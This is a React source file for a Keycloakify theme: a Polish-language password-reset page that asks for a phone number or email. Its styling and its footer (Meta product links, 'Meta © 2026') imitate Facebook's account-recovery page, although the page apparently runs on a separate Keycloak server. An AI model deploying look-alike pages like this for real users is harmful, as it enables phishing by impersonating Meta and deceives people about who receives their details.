import { useState } from "react";
import type { PageProps } from "keycloakify/login/pages/PageProps";
import type { KcContext } from "../KcContext";
import type { I18n } from "../i18n";

import CustomInput from "../../components/CustomInput";
import AuthButton from "../../components/AuthButton";

export default function LoginResetPassword(props: PageProps<Extract<KcContext, { pageId: "login-reset-password.ftl" }>, I18n>) {
    const { kcContext } = props;
    const { url, realm, auth } = kcContext;

    const [username, setUsername] = useState(auth.attemptedUsername ?? "");
    const [isSubmitting, setIsSubmitting] = useState(false);

    return (
        <div className="min-h-screen bg-white flex flex-col font-sans">
            <main className="grow flex flex-col items-center pt-[50px] px-4">
                <div className="w-full max-w-[600px] text-left">
                    <a
                        href={url.loginUrl}
                        className="mb-6 -ml-2 p-2 rounded-full hover:bg-gray-100 transition-colors text-gray-700 inline-block cursor-pointer"
                    >
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            fill="none"
                            viewBox="0 0 24 24"
                            strokeWidth="2.5"
                            stroke="currentColor"
                            className="w-5 h-5"
                        >
                            <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                d="M15.75 19.5L8.25 12l7.5-7.5"
                            />
                        </svg>
                    </a>

                    <h1 className="text-[28px] font-semibold text-[#1c1e21] mb-2 leading-tight">
                        Znajdź swoje konto
                    </h1>
                    <p className="text-[17px] text-[#1c1e21] mb-6">
                        {!realm.loginWithEmailAllowed
                            ? "Wprowadź nazwę użytkownika."
                            : !realm.registrationEmailAsUsername
                              ? "Wprowadź numer telefonu komórkowego lub adres e-mail."
                              : "Wprowadź adres e-mail."}
                    </p>

                    <form
                        id="kc-reset-password-form"
                        action={url.loginAction}
                        method="post"
                        onSubmit={() => {
                            setIsSubmitting(true);
                            return true;
                        }}
                        className="space-y-4"
                    >
                        {kcContext.message !== undefined && (
                            <div className={`p-3 text-sm rounded-lg border text-left ${
                                kcContext.message.type === "error"
                                    ? "text-red-600 bg-red-50 border-red-200"
                                    : "text-blue-600 bg-blue-50 border-blue-200"
                            }`}>
                                <span dangerouslySetInnerHTML={{ __html: kcContext.message.summary }} />
                            </div>
                        )}

                        <div className="mb-4">
                            <CustomInput
                                id="username"
                                name="username"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                label="Numer telefonu komórkowego lub adres e-mail"
                                variant="new"
                                disableFocusColor={true}
                                autoFocus
                            />
                        </div>

                        <AuthButton
                            type="submit"
                            disabled={username.trim().length === 0 || isSubmitting}
                        >
                            {isSubmitting ? "Wyszukiwanie..." : "Kontynuuj"}
                        </AuthButton>
                    </form>
                </div>
            </main>

            <footer className="w-full max-w-[1000px] mx-auto pb-10 pt-4 px-4 text-[#737373] text-[13px] border-t border-[#ccd0d5]">
                <ul className="flex flex-wrap gap-x-4 gap-y-2 mb-3">
                    <li><a href="#" className="hover:underline">Polski</a></li>
                    <li><a href="#" className="hover:underline">English (US)</a></li>
                    <li><a href="#" className="hover:underline">ślōnskŏ gōdka</a></li>
                    <li><a href="#" className="hover:underline">Русский</a></li>
                    <li><a href="#" className="hover:underline">Deutsch</a></li>
                    <li><a href="#" className="hover:underline">Français (France)</a></li>
                    <li><a href="#" className="hover:underline">Italiano</a></li>
                    <li>
                        <a
                            href="#"
                            className="hover:underline font-semibold bg-[#f5f6f7] px-2 py-1 rounded border border-[#ccd0d5]"
                        >
                            Więcej języków...
                        </a>
                    </li>
                </ul>

                <div className="w-full h-px bg-[#ccd0d5] my-3" />

                <ul className="flex flex-wrap gap-x-4 gap-y-2 mb-4">
                    <li><a href="#" className="hover:underline font-semibold">Zarejestruj się</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Zaloguj się</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Messenger</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Facebook Lite</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Film</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Meta Pay</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Sklep Meta</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Meta Quest</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Ray-Ban Meta</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Meta AI</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Instagram</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Threads</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Zasady ochrony prywatności</a></li>
                    <li><a href="#" className="hover:underline font-semibold">Centrum ochrony prywatności</a></li>
                </ul>

                <div className="mt-4 text-left">
                    Meta © 2026
                </div>
            </footer>
        </div>
    );
}
